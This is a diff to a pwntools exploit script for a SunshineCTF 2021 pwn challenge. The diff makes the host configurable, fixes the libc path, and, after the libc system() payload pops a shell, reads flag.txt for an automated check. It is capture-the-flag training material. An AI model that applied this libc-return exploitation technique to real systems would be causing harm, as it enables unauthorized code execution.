@@ -1,6 +1,5 @@
 from pwn import *
-from cffi import FFI
-from ptpython.repl import embed
+import os
 from pprint import pprint
 from typing import List, Union
 
@@ -9,13 +8,14 @@ LONG_DOUBLE_WIDTH = 16
 context.terminal = ["kitty", "-e", "sh", "-c"]
 
 # p = process("./sunshine_easy")
-p = remote("chal.2021.sunshinectf.org", 21001)
+p = remote(os.environ.get("HOST", "ctf.hackucf.org"), int(os.environ.get("PORT", "21001")))
 # gdb.attach(p,
 # """
 # b finish_up
 # """)
 
-libc = ELF("../dist/libc.so.6")
+_HERE = os.path.dirname(os.path.abspath(__file__))
+libc = ELF(os.path.join(_HERE, "..", "dist", "libc.so.6"))
 
 
 def get_one_gadgets(lib: str) -> List[int]:
@@ -104,4 +104,8 @@ payload += b"\x00" * (cyclic_find(p64(0x6161616461616163)) - len(payload))
 payload += p64(libc_base + libc.symbols["system"])
 p.sendline(payload)
 
-p.interactive()
+# Shell popped: print the flag so `pwnmake check` can verify it (instead of
+# dropping to an interactive shell).
+p.sendline(b"cat flag.txt")
+time.sleep(0.5)
+print(p.recvrepeat(2).decode("utf-8", errors="replace"))
